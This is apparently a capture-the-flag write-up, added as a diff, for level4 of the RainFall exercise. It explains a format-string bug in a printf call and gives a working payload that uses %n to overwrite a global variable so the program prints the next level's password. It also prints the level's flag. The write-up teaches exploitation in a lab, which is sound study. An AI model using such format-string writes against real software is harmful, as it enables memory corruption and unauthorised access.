@@ -1,0 +1,125 @@
+# Level4
+
+## Vulnerability
+Format string vulnerability in nested function call with specific value requirement.
+
+## Code Analysis
+As in level2, we can find an executable waiting for an input, print it and quit after press enter
+
+level4@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
+level4@RainFall:~$ ./level4
+AAA
+AAA
+level4@RainFall:~$
+
+After analyze the source.c we can see that the `main()` function call a function named `n()` who also call a function named `p()`.  
+```c
+int m;  // Global at 0x08049810
+
+void p(char *str) {
+    printf(str);  // FORMAT STRING BUG!
+}
+
+void n(void) {
+    char buffer[520];
+    fgets(buffer, 512, stdin);
+    p(buffer);
+    
+    if (m == 0x1025544) {  // Need m = 16930116
+        system("/bin/cat /home/user/level5/.pass");
+    }
+}
+```
+
+
+The `main()` only call `n()`, not very interesting so we can skip it.  
+We can see a call to `fgets()`, in `n()`, wich is protect against buffer overflow attack.
+
+```
+
+## Solution Steps
+
+1. **Find variable address**
+```bash
+   objdump -t level4 | grep " m"
+   # 08049810 g     O .bss    00000004    m
+```
+
+2. **Find format string position**
+```bash
+   python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x %x %x"' | ./level4
+   # Output shows 41414141 (AAAA) at position 12
+```
+
+3. **Calculate required value**
+   - Target: `0x1025544` = 16,930,116 in decimal
+   - Address takes 4 bytes
+   - Need to print: 16,930,116 - 4 = 16,930,112 more characters
+
+4. **Craft payload**
+```bash
+    level4@RainFall:~$ python -c 'print "AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x"' |./level4 
+    AAAA b7ff26b0 bffff794 b7fd0ff4 0 0 bffff758 804848d bffff550 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825 78252078
+    level4@RainFall:~$ 
+
+
+   python -c 'print "\x10\x98\x04\x08" + "%16930112d%12$n"' | ./level4
+```
+   - `\x10\x98\x04\x08`: Address of `m` (little-endian)
+   - `%16930112d`: Print 16,930,112 characters (padding)
+   - `%12$n`: Write total count (16,930,116) to 12th argument
+
+5. **Get flag**
+```
+   0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+```
+
+## Memory Layout
+```
+Stack:
++------------------+
+| main frame       |
+| n frame          |
+| p frame          |
+| printf return    |
+| format string    | ← our buffer
+| ... junk ...     | ← args 2-11
+| OUR ADDRESS      | ← arg 12 (0x08049810)
++------------------+
+Stack in level4:
++-----------------+
+| main's stuff    | ← main frame
++-----------------+
+| n's stuff       | ← n frame  
++-----------------+
+| p's stuff       | ← p frame
++-----------------+
+| printf return   |
++-----------------+
+| format string   | → our buffer
++-----------------+
+| (lots of junk)  | ← args 2-11
++-----------------+
+| OUR ADDRESS     | ← arg12 (position 12!)
++-----------------+
+
+```
+
+## Key Concept
+Deep stack format string: Address is at position 12 due to nested function calls (main → n → p → printf), requiring `%12$n` to reach it.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
